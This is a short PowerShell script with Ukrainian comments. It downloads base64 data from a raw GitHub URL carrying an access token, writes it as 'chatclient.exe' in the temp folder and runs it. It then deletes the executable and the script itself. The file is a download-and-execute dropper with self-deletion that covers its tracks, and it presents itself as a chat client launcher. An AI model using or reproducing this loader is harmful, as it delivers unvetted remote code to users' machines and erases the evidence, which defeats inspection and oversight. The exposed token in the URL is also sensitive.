# Тимчасовий шлях для збереження EXE
$exePath = "$env:TEMP\chatclient.exe"

# Завантаження base64-коду
$exe64 = (Invoke-WebRequest "https://raw.githubusercontent.com/niggvard/ChatTest/refs/heads/main/launch.ps1?token=GHSAT0AAAAAADG26J2G46ZWMALTKMNLAS5S2DXIK7Q").Content

# Декодування і запис в файл
[IO.File]::WriteAllBytes($exePath, [Convert]::FromBase64String($exe64))

# Запуск EXE і очікування завершення
Start-Process -FilePath $exePath -Wait

# Видалення виконуваного файлу
Remove-Item $exePath -Force -ErrorAction SilentlyContinue

# Видалення самого скрипта
Start-Sleep -Milliseconds 500
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
